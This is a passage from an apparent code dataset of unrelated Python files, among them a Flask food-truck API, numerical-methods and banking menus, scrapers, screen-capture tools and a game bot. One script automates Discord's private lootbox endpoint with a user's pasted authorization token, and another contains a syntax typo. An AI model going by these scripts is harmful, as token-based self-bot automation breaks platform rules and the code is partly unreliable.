\"failure\",\n            \"msg\": \"Please provide a query\"\n        })\n    try:\n        res = es.search(\n                index=\"sfdata\",\n                body={\n                    \"query\": {\"match\": {\"fooditems\": key}},\n                    \"size\": 750 # max document size\n              })\n    except Exception as e:\n        return jsonify({\n            \"status\": \"failure\",\n            \"msg\": \"error in reaching elasticsearch\"\n        })\n    # filtering results\n    vendors = set([x[\"_source\"][\"applicant\"] for x in res[\"hits\"][\"hits\"]])\n    temp = {v: [] for v in vendors}\n    fooditems = {v: \"\" for v in vendors}\n    for r in res[\"hits\"][\"hits\"]:\n        applicant = r[\"_source\"][\"applicant\"]\n        if \"location\" in r[\"_source\"]:\n            truck = {\n                \"hours\"    : r[\"_source\"].get(\"dayshours\", \"NA\"),\n                \"schedule\" : r[\"_source\"].get(\"schedule\", \"NA\"),\n                \"address\"  : r[\"_source\"].get(\"address\", \"NA\"),\n                \"location\" : r[\"_source\"][\"location\"]\n            }\n            fooditems[applicant] = r[\"_source\"][\"fooditems\"]\n            temp[applicant].append(truck)\n\n    # building up results\n    results = {\"trucks\": []}\n    for v in temp:\n        results[\"trucks\"].append({\n            \"name\": v,\n            \"fooditems\": format_fooditems(fooditems[v]),\n            \"branches\": temp[v],\n            \"drinks\": fooditems[v].find(\"COLD TRUCK\") > -1\n        })\n    hits = len(results[\"trucks\"])\n    locations = sum([len(r[\"branches\"]) for r in results[\"trucks\"]])\n\n    return jsonify({\n        \"trucks\": results[\"trucks\"],\n        \"hits\": hits,\n        \"locations\": locations,\n        \"status\": \"success\"\n    })\n\nif __name__ == \"__main__\":\n    ENVIRONMENT_DEBUG = os.environ.get(\"DEBUG\", False)\n    check_and_load_index()\n    app.run(host='0.0.0.0', port=5000, debug=ENVIRONMENT_DEBUG)\n",
    "import numpy as np\r\nimport matplotlib\r\nimport matplotlib.pyplot as plt\r\nfrom tabulate import tabulate\r\nmatplotlib.use('TkAgg')#solucion error para mostrar la grafica  al hacer un ejecutable del codigo \r\nimport os\r\nimport time\r\nfrom colorama import init, Fore              #follow in ig: @imleticio \r\nfrom sympy import symbols\r\nfrom  sympy import lambdify\r\nfrom  sympy import sympify,simplify\r\nfrom pyfiglet import figlet_format\r\nfrom rich.console import Console   \r\nfrom rich.markdown import Markdown\r\nfrom rich.table import Table\r\nfrom time import sleep\r\nfrom rich.panel import Panel\r\nimport sympy \r\nfrom sympy import symbols, Eq, solve, diff\r\nfrom rich.style import Style\r\n#==============================================================================\r\ninit()\r\ninit(autoreset=True)\r\nconsole = Console()\r\n\r\ndef limpiar_consola():\r\n    os.system('cls' if os.name == 'nt' else 'clear')\r\n\r\n#==============================================================================\r\ntexto1 = \"\"\"\r\nLas funciones se ingresan\r\n-a*x**exponente\r\n- seno=sin()\r\n- coseno=cos() \r\n- tangente=tanh()\r\n- e=exp()\r\n\r\nsiempre en funci\u00f3n de x\r\n\"\"\"\r\nx = symbols('x')\r\n\r\ntexto2=\"\"\"\r\nElija una opcion:\r\n-A)Metodo Biseccion\r\n-B)metodo Regula Fassi\r\n-C)Metodo de Newton\r\n-D)Metodo Secante\"\"\"\r\n#==============================================================================\r\n\r\ndef menu():\r\n    \r\n    \r\n    \r\n    while True:\r\n            limpiar_consola()\r\n            print(Fore.GREEN+figlet_format('Metodos Numericos',font=\"doom\",justify='center',width=120))\r\n            Paneli= Panel(texto2, title=\"Menu\", border_style=\"white\", width=40, expand=False)\r\n            console.print(Paneli, justify=\"center\")\r\n            respuesta=console.input((':yellow_circle: Seleccione una [bold cyan]opcion:[/bold cyan]'))\r\n            if respuesta.upper()=='A':\r\n        \r\n        \r\n                while True:\r\n                \r\n                        fx,f,intervalo_x1,intervalo_x2,criterio_toleranza,aux_metodos=pedir_datos(respuesta)\r\n                        aux_intervalox1=intervalo_x1\r\n                        aux_intervalox2=intervalo_x2\r\n\r\n                        funcion,solucion,contador,intervalo_x1,intervalo_x2,arr,arr2,arr3,arr4,arr5,bandera =metodo_de_biseccion(f,intervalo_x1,intervalo_x2,criterio_toleranza,fx)\r\n\r\n                \r\n\r\n                        if bandera==0:\r\n                            aux_solucion=float(solucion)\r\n                            mostrar_resultado(funcion,solucion,contador,intervalo_x1,intervalo_x2,arr,arr2,arr3,arr4,arr5,aux_metodos)\r\n                            print(mostrar_grafica(fx,f,aux_solucion,aux_intervalox1,aux_intervalox2,respuesta))\r\n                            \r\n                            break\r\n            elif respuesta.upper()=='B':\r\n        \r\n        \r\n\r\n                while  True:\r\n                \r\n                        fx,f,intervalo_x1,intervalo_x2,criterio_toleranza,aux_metodos=pedir_datos(respuesta)\r\n                        aux_intervalox1=intervalo_x1\r\n                        aux_intervalox2=intervalo_x2\r\n\r\n\r\n                        funcion,solucion,contador,intervalo_x1,intervalo_x2,arr,arr2,arr3,arr4,arr5,bandera=metodo_regula_falsi(f,intervalo_x1,intervalo_x2,criterio_toleranza,fx)\r\n                \r\n\r\n                        if bandera==0:\r\n                            aux_solucion=float(solucion)\r\n                            mostrar_resultado(funcion,solucion,contador,intervalo_x1,intervalo_x2,arr,arr2,arr3,arr4,arr5,aux_metodos)\r\n                            print(mostrar_grafica(fx,f,aux_solucion,aux_intervalox1,aux_intervalox2,respuesta))\r\n                            break\r\n\r\n            elif respuesta.upper()=='C':\r\n          \r\n          \r\n\r\n                while True:\r\n                        fx,f,intervalo_x1,intervalo_x2,criterio_toleranza,aux_metodos=pedir_datos(respuesta)\r\n                        aux_intervalox1=intervalo_x1\r\n                        aux_intervalox2=intervalo_x2\r\n                        funcion,solucion,contador,intervalo_x1,intervalo_x2,arr,arr2,arr3,arr4,arr5,bandera=metodo_newtonRaphson(f,intervalo_x1,intervalo_x2,criterio_toleranza,fx)\r\n                \r\n                        if bandera==0:\r\n                            aux_solucion=float(solucion)\r\n                            mostrar_resultado(funcion,solucion,contador,intervalo_x1,intervalo_x2,arr,arr2,arr3,arr4,arr5,aux_metodos)\r\n                            print(mostrar_grafica(fx,f,aux_solucion,aux_intervalox1,aux_intervalox2,respuesta))\r\n                            \r\n                            break\r\n                           \r\n          \r\n            elif respuesta.upper()=='D':\r\n          \r\n                while True:\r\n                \r\n                        fx,f,intervalo_x1,intervalo_x2,criterio_toleranza,aux_metodos=pedir_datos(respuesta)\r\n                        aux_intervalox1=intervalo_x1\r\n                        aux_intervalox2=intervalo_x2\r\n                        funcion,solucion,contador,intervalo_x1,intervalo_x2",
    "import sys\nfrom shorten import shorten\nfrom tkinter import Label, Entry, Button, Tk, filedialog, END, Text, W, E, N, S, StringVar\n\n\nclass StdoutRedirector(object):\n    def __init__(self, text_widget):\n        self.text_space = text_widget\n\n    def write(self, string):\n        self.text_space.configure(state='normal')\n        self.text_space.insert('end', string)\n        self.text_space.see('end')\n        self.text_space.configure(state='disabled')\n\n    def flush(self):\n        pass\n\n\nclass Window:\n    def __init__(self, master):\n        self.input = None\n        Label(root, text=\"Target directory\").grid(row=1, column=0, sticky=W)\n        Label(root, text=\"Target file length\").grid(row=2, column=0, sticky=W)\n        self.bart = Entry(master, state='disabled')\n        self.bart.grid(row=1, column=1, sticky=W + E)\n        barl_default_value = StringVar(root, value='256')\n        self.barl = Entry(master, textvariable=barl_default_value)\n        self.barl.grid(row=2, column=1, sticky=W + E)\n\n        # Buttons\n        self.tbutton = Button(root, text=\"Browse\", command=self.browseinput)\n        self.tbutton.grid(row=1, column=3, sticky=E)\n        self.sbutton = Button(root, text=\"Shorten filenames\", command=self.process)\n        self.sbutton.grid(row=3, column=3, sticky=E)\n\n        self.text_box = Text(root, wrap='word', height=10, state='disabled')\n        self.text_box.grid(column=0, row=4, padx=5, pady=5, columnspan=4, sticky=W + E + N + S)\n        sys.stdout = StdoutRedirector(self.text_box)\n        sys.stderr = StdoutRedirector(self.text_box)\n\n    def browseinput(self):\n        Tk().withdraw()\n        self.input = filedialog.askdirectory()\n        self.bart.configure(state='normal')\n        self.bart.delete(0, END)\n        self.bart.insert(0, self.input)\n        self.bart.configure(state='disabled')\n\n    def process(self):\n        if self.input:\n            shorten(self.input, int(self.barl.get()))\n        else:\n            print(\"Error: Please select target directory.\")\n\n\ndef on_closing():\n    root.destroy()\n    sys.exit(0)\n\n\nroot = Tk()\nroot.title(\"DevInit filename shortener\")\nroot.protocol(\"WM_DELETE_WINDOW\", on_closing)\nwindow = Window(root)\nroot.mainloop()\n",
    "import streamlit as st\nimport plotly.express as px\nfrom backend import get_data\n\nst.title(\"Weather Forecast for the Next Days\")\nplace = st.text_input(\"Place: \", value=\"Tokyo\")\ndays = st.slider(\"Forecast Days\", min_value=1, max_value=5, \n                 help=\"Select the number of forecasted days\")\noption = st.selectbox(\"Select data to view\", (\"Temperature\", \"Sky\"))\nst.subheader(f\"{option} for the next {days} days in {place}\")\n\ntry:\n    filtered_data = get_data(place, days)\n\n    labels = {\"x\": \"Date\", \"y\": \"Temperature (C)\"}\n\n    if option == \"Temperature\":\n        temperatures = [dict[\"main\"][\"temp\"] / 10 for dict in filtered_data]\n        dates = [dict[\"dt_txt\"] for dict in filtered_data]\n        figure = px.line(x=dates, y=temperatures, labels=labels)\n        st.plotly_chart(figure)\n\n    if option == \"Sky\":\n        sky_conditions = [dict[\"weather\"][0][\"main\"] for dict in filtered_data]\n        image_paths = {\n            \"Clear\": \"images/clear.png\",\n            \"Clouds\": \"images/cloud.png\",\n            \"Rain\": \"images/rain.png\",\n            \"Snow\": \"images/snow.png\"\n        }\n        images = [image_paths[condition] for condition in sky_conditions]\n        st.image(images, width=115)\nexcept KeyError:\n    st.write(\"This place does not exist.\")",
    "import rclpy\nfrom rclpy.node import Node\nfrom cv_bridge import CvBridge\nimport time\nimport mediapipe as mp\nimport numpy as np\nfrom mediapipe.tasks import python\nfrom mediapipe.tasks.python import vision\nimport pyrealsense2 as rs\nfrom std_msgs.msg import String\nfrom sensor_msgs.msg import Image\n\nclass GestureRecognitionNode(Node):\n    def __init__(self):\n        super().__init__('camera_feed')\n        # Start RealSense pipeline\n        self.pipeline = rs.pipeline()\n        self.pipeline.start()\n        \n        self.prev_timestamp_ms = 0\n\n        # Create publisher for recognized gesture\n        self.publisher_ = self.create_publisher(Image, 'rs_camera_feed', 10)\n\n        self.timestamp_publisher = self.create_publisher(String, 'frame_timestamp', 10)\n\n        # The CvBridge allows OpenCv data to be sent via ROS2 Interfaces\n        self.bridge = CvBridge()\n\n    def run(self):\n        while True:\n            # Wait for a coherent pair of frames: depth and color\n            frames = self.pipeline.wait_for_frames()\n            color_frame = frames.get_color_frame()\n            color_frame_data = np.array(color_frame.get_data(), dtype=np.uint8)\n\n            # Current timestamp in milliseconds\n            frame_timestamp_ms = int(time.time() * 1000)  \n\n            if frame_timestamp_ms <= self.prev_timestamp_ms:\n                # If current timestamp is not greater than previous, skip processing\n                continue\n\n            # Update previous timestamp\n            self.prev_timestamp_ms = frame_timestamp_ms  \n\n            # Switch image color channel encoding\n            img_msg = self.bridge.cv2_to_imgmsg(color_frame_data, encoding='bgr8')\n\n            # Publish messages\n            self.publisher_.publish(img_msg)\n            msg = String()\n            msg.data = str(frame_timestamp_ms)\n            self.timestamp_publisher.publish(msg)\n\ndef main(args=None):\n    rclpy.init(args=args)\n    gesture_recognition_node = GestureRecognitionNode()\n    gesture_recognition_node.run()\n    rclpy.spin(gesture_recognition_node)\n    gesture_recognition_node.destroy_node()\n    rclpy.shutdown()\n\nif __name__ == '__main__':\n    main()\n",
    "import win32gui\nimport win32ui\nimport win32con\nimport numpy as np\nimport cv2\n\ndef window_capture(filename):\n    # \u7a97\u53e3\u7684\u7f16\u53f7\uff0c0\u53f7\u8868\u793a\u5f53\u524d\u6d3b\u8dc3\u7a97\u53e3\n    hwnd = 0\n\n    # \u6839\u636e\u7a97\u53e3\u53e5\u67c4\u83b7\u53d6\u7a97\u53e3\u7684\u8bbe\u5907\u4e0a\u4e0b\u6587DC\uff08Device Context\uff09\n    hwndDC = win32gui.GetWindowDC(hwnd)\n\n    # \u6839\u636e\u7a97\u53e3\u7684DC\u83b7\u53d6mfcDC\n    mfcDC = win32ui.CreateDCFromHandle(hwndDC)\n\n    # mfcDC\u521b\u5efa\u53ef\u517c\u5bb9\u7684DC\n    saveDC = mfcDC.CreateCompatibleDC()\n\n    # \u521b\u5efabigmap\u51c6\u5907\u4fdd\u5b58\u56fe\u7247\n    saveBitMap = win32ui.CreateBitmap()\n\n    # \u83b7\u53d6\u76d1\u63a7\u5668\u4fe1\u606f\n    # MoniterDev = win32api.EnumDisplayMonitors(None, None)\n    # w = MoniterDev[0][2][2]\n    # h = MoniterDev[0][2][3]\n    w = 1280\n    h = 800\n\n    # \u4e3abitmap\u5f00\u8f9f\u7a7a\u95f4\n    saveBitMap.CreateCompatibleBitmap(mfcDC, 1280, 800)\n\n    # \u9ad8\u5ea6saveDC\uff0c\u5c06\u622a\u56fe\u4fdd\u5b58\u5230saveBitmap\u4e2d\n    saveDC.SelectObject(saveBitMap)\n\n    # \u622a\u53d6\u4ece\u5de6\u4e0a\u89d2(640,400) \u5230 (1920,1200)\u7684\u56fe\u7247\n    saveDC.BitBlt((0, 0), (w, h), mfcDC, (640, 400), win32con.SRCCOPY)\n\n    # \u4fdd\u5b58bitmap\u5230\u6587\u4ef6\n    saveBitMap.SaveBitmapFile(saveDC, filename)\n\ndef window_capture2mat():\n    # Window handle (0 for the active window)\n    hwnd = 0\n\n    # Get the device context (DC) of the window based on the handle\n    hwndDC = win32gui.GetWindowDC(hwnd)\n\n    # Create an MFC DC from the window's DC\n    mfcDC = win32ui.CreateDCFromHandle(hwndDC)\n\n    # Create a compatible DC for saving\n    saveDC = mfcDC.CreateCompatibleDC()\n\n    # Create a bitmap to save the image\n    saveBitMap = win32ui.CreateBitmap()\n\n    # Monitor resolution (adjust as needed)\n    w = 1280\n    h = 800\n\n    # Allocate space for the bitmap\n    saveBitMap.CreateCompatibleBitmap(mfcDC, w, h)\n\n    # Select the bitmap into the saveDC\n    saveDC.SelectObject(saveBitMap)\n\n    # Capture the image from (640, 400) to (1920, 1200)\n    saveDC.BitBlt((0, 0), (w, h), mfcDC, (640, 400), win32con.SRCCOPY)\n\n    # Get the bitmap bits\n    signedIntsArray = saveBitMap.GetBitmapBits(True)\n    img = np.frombuffer(signedIntsArray, dtype='uint8')\n    img.shape = (h, w, 4)\n\n    # Free resources\n    win32gui.DeleteObject(saveBitMap.GetHandle())\n    saveDC.DeleteDC()\n    mfcDC.DeleteDC()\n    win32gui.ReleaseDC(hwnd, hwndDC)\n\n    # Drop the alpha channel, or cv2.cvtColor will throw an error\n    # because of the extra channel\n    img = img[..., :3]\n\n    # Convert to BGR format for OpenCV\n    img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)\n\n    return img\n\ndef window_capture2pic(filename):\n    img = window_capture2mat()\n    cv2.imwrite(filename, img)\n\nif __name__ == '__main__':\n    import time\n    import subprocess\n\n    # 1  100 -> 120\n    # 2  200 -> 245\n    # 3  300 -> 385\n\n    # 1.25 100 -> 138 200 -> 300\n\n    # 100 - 184\n    # 200 - 370\n    time.sleep(5)\n    window_capture2pic('test.jpg')\n    # D:\\My_C\\ai\\cheat\\test.exe\n    subprocess.run('D:\\\\My_C\\\\ai\\\\cheat\\\\test.exe')\n    time.sleep(5)\n    window_capture2pic('test2.jpg')\n    \n\n\n\n\n",
    "import tkinter as tk\r\nfrom tkinter import messagebox, scrolledtext\r\nimport requests\r\nfrom bs4 import BeautifulSoup\r\n\r\n\r\ndef scrape_novel():\r\n    # \u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684\u53c2\u6570\r\n    list_url = catalog_url_entry.get()\r\n    baseurl = chapter_url_prefix_entry.get()\r\n    novel_list_selector = novel_list_entry.get()\r\n    novel_body_selector = novel_body_entry.get()\r\n    novel_title = ''\r\n    # \u68c0\u67e5\u7528\u6237\u8f93\u5165\u662f\u5426\u4e3a\u7a7a\r\n    if not list_url.strip() or not baseurl.strip():\r\n        messagebox.showerror(\"Error\", \"\u5c0f\u8bf4\u5730\u5740URL\u548c\u76ee\u5f55URL\u4e0d\u80fd\u4e3a\u7a7a\uff01\")\r\n        return\r\n\r\n    headers = {\r\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.222 Safari/537.36'\r\n    }\r\n\r\n    try:\r\n        # \u83b7\u53d6\u5c0f\u8bf4\u76ee\u5f55\u9875\u9762\u5185\u5bb9\r\n        catalog_response = requests.get(url=baseurl + list_url, headers=headers)\r\n        catalog_response.raise_for_status()  # \u68c0\u67e5\u8bf7\u6c42\u662f\u5426\u6210\u529f\r\n        catalog_response.encoding = catalog_response.apparent_encoding\r\n        catalog_soup = BeautifulSoup(catalog_response.text, \"lxml\")\r\n\r\n        #\u89e3\u6790\u5c0f\u8bf4\u6807\u9898\r\n        for cover_div in catalog_soup.select('div.cover'):\r\n            img_alt = cover_div.img.get('alt')\r\n            novel_title = img_alt\r\n\r\n\r\n        # \u89e3\u6790\u5c0f\u8bf4\u76ee\u5f55\u5e76\u9010\u4e00\u722c\u53d6\u7ae0\u8282\u5185\u5bb9\r\n        chapters = catalog_soup.select(novel_list_selector)\r\n        for chapter in chapters:\r\n            if chapter.a['href'] != 'javascript:dd_show()':\r\n                chapter_url = baseurl + chapter.a['href']\r\n                chapter_response = requests.get(url=chapter_url, headers=headers)\r\n                chapter_response.raise_for_status()  # \u68c0\u67e5\u8bf7\u6c42\u662f\u5426\u6210\u529f\r\n                chapter_response.encoding = chapter_response.apparent_encoding\r\n                chapter_soup = BeautifulSoup(chapter_response.text, 'lxml')\r\n                chapter_content = chapter_soup.select_one(novel_body_selector).get_text()\r\n\r\n                # \u5c06\u7ae0\u8282\u5185\u5bb9\u5199\u5165\u6587\u4ef6\r\n                with open('./'+novel_title+'.txt', 'a', encoding='utf-8') as fp:\r\n                    fp.write(chapter.string + \"\\n\" + chapter_content + '\\n')\r\n\r\n                # \u5728\u7ed3\u679c\u6587\u672c\u6846\u4e2d\u663e\u793a\u722c\u53d6\u6210\u529f\u4fe1\u606f\r\n                result_text.config(state=tk.NORMAL)\r\n                result_text.insert(tk.END, chapter.string + \"\u83b7\u53d6\u6210\u529f!\\n\")\r\n                root.update()  # \u66f4\u65b0\u754c\u9762\r\n\r\n        result_text.config(state=tk.DISABLED)\r\n\r\n    except requests.exceptions.RequestException as e:\r\n        messagebox.showerror(\"Error\", f\"\u8bf7\u6c42\u9519\u8bef: {e}\")\r\n        result_text.config(state=tk.NORMAL)\r\n        result_text.insert(tk.END, f\"\u8bf7\u6c42\u9519\u8bef: {e}\\n\")\r\n        result_text.config(state=tk.DISABLED)\r\n\r\n    except Exception as e:\r\n        messagebox.showerror(\"Error\", f\"\u722c\u53d6\u5c0f\u8bf4\u5931\u8d25: {e}\")\r\n        result_text.config(state=tk.NORMAL)\r\n        result_text.insert(tk.END, f\"\u722c\u53d6\u5c0f\u8bf4\u5931\u8d25: {e}\\n\")\r\n        result_text.config(state=tk.DISABLED)\r\n\r\n\r\ndef stop_scraping():\r\n    # \u5728\u8fd9\u91cc\u6dfb\u52a0\u505c\u6b62\u722c\u53d6\u7684\u903b\u8f91\r\n    pass\r\n\r\n\r\n# \u521b\u5efa\u9875\u9762ui\r\nroot = tk.Tk()\r\nroot.title(\"Novel Liuxin\")\r\n\r\n# \u6dfb\u52a0\u6807\u7b7e\u548c\u8f93\u5165\u6846\r\nchapter_url_prefix_label = tk.Label(root, text=\"\u5c0f\u8bf4\u7f51\u7ad9\u5730\u5740:\")\r\nchapter_url_prefix_label.grid(row=0, column=0, sticky=\"e\")\r\nchapter_url_prefix_entry = tk.Entry(root, width=50)\r\nchapter_url_prefix_entry.grid(row=0, column=1, padx=5, pady=5)\r\nchapter_url_prefix_entry.insert(tk.END, \"https://www.biqg.cc\")\r\n\r\ncatalog_url_label = tk.Label(root, text=\"\u5c0f\u8bf4\u76ee\u5f55\u8def\u5f84:\")\r\ncatalog_url_label.grid(row=1, column=0, sticky=\"e\")\r\ncatalog_url_entry = tk.Entry(root, width=50)\r\ncatalog_url_entry.grid(row=1, column=1, padx=5, pady=5)\r\ncatalog_url_entry.insert(tk.END, \"/book/2061/\")\r\n\r\nnovel_list_label = tk.Label(root, text=\"\u5c0f\u8bf4\u76ee\u5f55\u89c4\u5219:\")\r\nnovel_list_label.grid(row=2, column=0, sticky=\"e\")\r\nnovel_list_entry = tk.Entry(root, width=50)\r\nnovel_list_entry.grid(row=2, column=1, padx=5, pady=5)\r\nnovel_list_entry.insert(tk.END, '.listmain > dl dd')\r\n\r\nnovel_body_label = tk.Label(root, text=\"\u5c0f\u8bf4\u5185\u5bb9\u89c4\u5219:\")\r\nnovel_body_label.grid(row=3, column=0, sticky=\"e\")\r\nnovel_body_entry = tk.Entry(root, width=50)\r\nnovel_body_entry.grid(row=3, column=1, padx=5, pady=5)\r\nnovel_body_entry.insert(tk.END, '#chaptercontent')\r\n\r\nscrape_button = tk.Button(root, text=\"\u8fd0\u884c\u7a0b\u5e8f\", command=scrape_novel)\r\nscrape_button.grid(row=4, column=0, padx=5, pady=10)\r\n\r\nstop_button = tk.Button(root, text=\"\u7ed3\u675f\u722c\u53d6\", command=stop_scraping)\r\nstop_button.grid(row=4, column=1, padx=5, pady=10)\r\n\r\nresult_text = scrolledtext.ScrolledText(root, width=60, height=10)\r\nresult_text.grid(row=5, column=0, columnspan=2, padx=5, pady=5)\r\nresult_text.config(state=tk.DISABLED)\r\n\r\nroot.mainloop()\r\n",
    "import httpx, time\n\nurl = \"https://discord.com/api/v9/users/@me/lootboxes/open\"\nauthorization = input(\"\u0412\u0432\u0435\u0434\u0438 authorization \u0438\u0437 \u0445\u0438\u0434\u0435\u0440\u043e\u0432 \u0437\u0430\u043f\u0440\u043e\u0441\u0430:\\n> \")\nheaders = {\n    \"authorization\": authorization,\n    \"x-super-properties\": \"eyJjbGllbnRfYnVpbGRfbnVtYmVyIjoyODAzNDZ9\"\n}\ncd = 4.5\nwhile True:\n    response = httpx.post(\n        url=url,\n        headers=headers,\n    )\n    if response.status_code != 200:\n        print(\"\u0421\u043b\u0443\u0447\u0438\u043b\u0430\u0441\u044c \u043a\u0430\u043a\u0430\u044f-\u0442\u043e \u0435\u0431\u0430\u043d\u0438\u043d\u0430, \u0437\u0430\u043f\u0440\u043e\u0441 \u043d\u0435 \u043f\u0440\u043e\u0448\u0435\u043b\")\n    elif response.status_code == 200:\n        try:\n            opened = \"xxx\"\n            lootbox_data = response.json().get(\"user_lootbox_data\")\n            if lootbox_data:\n                opened_items = lootbox_data.get(\"opened_items\")\n                if opened_items:\n                    opened = sum(opened_items.values())\n            print(f\"{response} | Opened -> {opened}\")\n        except Exception as e:\n            print(\n                f\"{response} | {e} | \u0412 \u0437\u0430\u043f\u0440\u043e\u0441\u0435 \u0432\u0435\u0440\u043d\u0443\u043b\u043e \u043a\u0430\u043a\u0443\u044e-\u0442\u043e \u0435\u0431\u0430\u043d\u0438\u043d\u0443, \u043d\u043e \u043b\u0443\u0442\u0431\u043e\u043a\u0441 \u043e\u0442\u043a\u0440\u044b\u043b\u0441\u044f\\n{response.text}\"\n            )\n    time.sleep(cd)\n",
    "import cv2\nimport cvzone\nimport numpy as np\nimport pyautogui\nform cvzone.FPS import FPS\nfrom mss import mss\n\nfpsReader = FPS()\n\ndef capture_screen_region_opencv(x, y, desired_width, desired_height):\n  screenshot = pyautogui.screenshot(region=(x, y, desired_width, desired_height))\n  screenshot = np.array(screenshot)\n  screenshot = cv2.cvtColor(screenshot, cv2.COLOR_RGB2BGR)\n  return screenshot\n\n\ndef capture_screen_region_opencv_mss(x, y, width, height):\n    with mss() as sct:\n        monitor = {\"top\": y, \"left\": x, \"width\": width, \"height\": height}\n        screenshot = sct.grab(monitor)\n        # Convert to an OpenCV image\n        img = np.array(screenshot)\n        img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)  # Convert from BGRA to BGR\n\n        return img\n\ndef pre_process(_imgCrop):\n    # Convert to grayscale for thresholding\n    gray_frame = cv2.cvtColor(_imgCrop, cv2.COLOR_BGR2GRAY)\n    # Apply thresholding to the grayscale image\n    _, binary_frame = cv2.threshold(gray_frame, 127, 255, cv2.THRESH_BINARY_INV)\n    # cv2.imshow(\"binary_frame\", binary_frame)\n    # canny image\n    canny_frame = cv2.Canny(binary_frame, 50, 50)\n    # cv2.imshow(\"canny_fram\", canny_frame)\n    # dilate image\n    kernel = np.ones((5, 5))\n    dilated_frame = cv2.dilate(canny_frame, kernel, iterations=1)\n    # cv2.imshow(\"dilated_frame\", dilated_frame)\n\n    return dilated_frame\n\ndef find_obstacles(_imgCrop, _imgPre):\n    imgContours, conFound = cvzone.findContours(_imgCrop, _imgPre, minArea=100, filter=None)\n    return imgContours, conFound\n\ndef game_logic(conFound, _imgContours, jump_distance=65):\n    if conFound:\n        # left most contour\n        left_most_contour = sorted(conFound, key=lambda x: x[\"bbox\"][0])\n        print(left_most_contour[0][\"bbox\"][0])\n\n        cv2.line(_imgContours, (0, left_most_contour[0][\"bbox\"][1] + 10),\n                 (left_most_contour[0][\"bbox\"][0], left_most_contour[0][\"bbox\"][1] + 10), (0, 200, 0), 10)\n\n        # draw line on screenShotGame from left most contour\n        if left_most_contour[0][\"bbox\"][0] < jump_distance:\n            pyautogui.press(\"space\")\n            print(\"jump\")\n    return _imgContours\n\n\nwhile True:\n    # Step 1 - Capture the screen region of game\n    imgGame = capture_screen_region_opencv_mss(450, 300, 650, 200)\n\n    # Step 2 - Crop the image to the desired region\n    cp = 100, 140, 110\n    imgCrop = imgGame[cp[0]:cp[1], cp[2]:]\n\n    # step 3 < per process image\n    imgPro = pre_process(imgCrop)\n\n    # Step 4 - Find Obstacles\n    imgContours, conFound = find_obstacles(imgCrop, imgPro)\n\n    # Step 5 - Apply Game Logic\n    imgContours = game_logic(conFound, imgContours)\n\n    # # Step 6 - Display the Result\n    imgGame[cp[0]:cp[1], cp[2]:] = imgContours\n\n    fps, imgGame = fpsReader.update(imgGame)\n\n    cv2.imshow(\"Game\", imgGame)\n    # cv2.imshow(\"imgCrop\", imgGame)\n    # cv2.imshow(\"imgContours\", imgContours)\n    cv2.waitKey(1)\n\n\n\n\n  \n",
    "saldo= 23 #numero Inteiro\r\n\r\n\r\n#Op\u00e7\u00f5es do Menu\r\nprint(\"Bem-vindo a sua conta bancaria!\")\r\nprint(\"Por favor, escolha uma op\u00e7\u00e3o:\")\r\nprint(\"1. Transferir\")\r\nprint(\"2. Depositar\")\r\nprint(\"3. Retirar\")\r\n#escolha\r\nescolha = input(\"Digite o n\u00famero correspondente \u00e0 sua escolha: \")\r\n\r\nif escolha == \"1\":\r\n    transferencia = int(input(\"Digite O Valor Da Transferencia: \"))\r\n    saldo -= transferencia  # Adiciona o valor da transfer\u00eancia ao saldo\r\n    print(\"Transfer\u00eancia realizada com sucesso. Seu novo saldo \u00e9:\", saldo)\r\nelif escolha == \"2\":\r\n    deposito = int(input(\"Digite O Valor Do Deposito: \"))\r\n    saldo += deposito  # Adiciona o valor da transfer\u00eancia ao saldo\r\n    print(\"Deposito realizado com sucesso. Seu novo saldo \u00e9:\", saldo)\r\nelif escolha == \"3\":\r\n    retirada = int(input(\"Digite o Valor Da Retirada: \"))  \r\n    if saldo < retirada:\r\n        print(\"Saldo Insuficiente, Tente Novamente!\")\r\n    else:\r\n        saldo -= retirada\r\n        print(\"Retirada realizada com sucesso. Seu novo saldo \u00e9:\", saldo)\r\nelse:\r\n    print(\"Op\u00e7\u00e3o inv\u00e1lida. Por favor, escolha um n\u00famero v\u00e1lido.\")",
    "def quadrant_to_azimuth(quadrant):\r\n    parts = quadrant.split()\r\n    if len(parts) != 3:\r\n        return None  # by ninja dev @nnb44\r\n\r\n    direction, angle, cardinal = parts\r\n    try:\r\n        angle = float(angle)\r\n    except ValueError:\r\n        return None\r\n\r\n    if direction == 'N':\r\n        if cardinal == 'E':\r\n            azimuth = angle\r\n        elif cardinal == 'W':\r\n            azimuth = 360 - angle\r\n        else:\r\n            return None\r\n    elif direction == 'S':\r\n        if cardinal == 'E':\r\n            azimuth = 180 - angle\r\n        elif cardinal == 'W':\r\n            azimuth = 180 + angle\r\n        else:\r\n            return None\r\n    else:\r\n        return None  # by ninja dev @nnb44\r\n\r\n    return azimuth\r\n\r\ndef azimuth_to_quadrant(NorthAzimu): # by ninja dev @nnb44\r\n    if 0 <= NorthAzimu < 90:\r\n        quad = 'N ' + str(NorthAzimu) + ' E'\r\n    elif 90 <= NorthAzimu < 180:\r\n        quad = 'S ' + str(180 - NorthAzimu) + ' E'\r\n    elif 180 <= NorthAzimu < 270:\r\n        quad = 'S ' + str(NorthAzimu - 180) + ' W'\r\n    else:\r\n        quad = 'N ' + str(360 - NorthAzimu) + ' W'\r\n    return quad\r\n\r\ndef main():\r\n    choice = input(\"Choose conversion (1 for quadrant to azimuth, 2 for azimuth to quadrant): \")\r\n    if choice == '1':\r\n        quadrant_input = input(\"Enter the quadrant (e.g., N 45 E): \")\r\n        azimuth_result = quadrant_to_azimuth(quadrant_input)\r\n        if azimuth_result is not None:\r\n            print(f\"Azimuth: {azimuth_result} degrees\")\r\n        else:\r\n            print(\"Invalid input. Please provide a valid quadrant (e.g., N 45 E).\")\r\n    elif choice == '2':\r\n        azimuth_input = float(input(\"Enter the azimuth angle (degrees): \"))\r\n        quadrant_result = azimuth_to_quadrant(azimuth_input)\r\n        if quadrant_result is not None:\r\n            print(f\"Quadrant: {quadrant_result}\")\r\n        else:\r\n            print(\"Invalid input. Please provide a valid azimuth angle.\")\r\n    else:\r\n        print(\"Invalid choice. Please enter 1 or 2.\")\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n# by ninja dev @nnb44",
